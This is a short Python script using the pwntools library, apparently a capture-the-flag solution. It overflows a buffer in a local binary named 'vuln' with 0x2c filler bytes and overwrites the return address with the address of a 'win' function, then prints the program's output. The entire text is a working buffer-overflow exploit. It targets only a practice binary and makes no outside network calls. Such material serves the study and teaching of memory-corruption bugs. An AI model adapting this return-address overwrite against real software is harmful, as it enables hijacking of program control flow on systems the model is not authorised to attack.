from pwn import *

target = ELF('./vuln')

r = process('./vuln')

payload = ''
payload += 'A' * 0x2c
payload += p32(target.symbols['win'])

r.sendlineafter('Please enter your string: \n', payload)

r.recvuntil('Jumping to')
r.recvline()

print(r.recvall())
